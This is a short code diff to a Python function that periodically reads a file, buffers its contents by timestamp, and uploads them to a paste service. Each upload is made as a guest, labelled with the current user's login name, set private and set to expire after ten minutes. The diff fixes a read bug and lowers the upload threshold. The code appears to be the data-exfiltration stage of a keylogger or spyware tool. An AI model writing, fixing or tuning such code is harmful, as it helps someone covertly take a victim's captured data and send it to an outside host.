@@ -58,12 +58,10 @@ def fill_buffer_upload(myInode, uploadInterval):
         print(e)
     while exists(myInode):
         print('inside exis')
-        sleep(uploadInterval)
-        temp = f.read()
-        if not temp:
-            bufferToUp[get_timestamp_str()]= temp
+        sleep(uploadInterval)      
+        bufferToUp[get_timestamp_str()]= f.read()
         print(bufferToUp)
-        if(sys.getsizeof(bufferToUp)>1000):
+        if(sys.getsizeof(bufferToUp)>700):
             data = json.dumps(bufferToUp)
             result = api.paste(data, guest=True, name="Logs for: {}".format(getpass.getuser()), format='json', private='1', expire='10M')
             sleep(2)
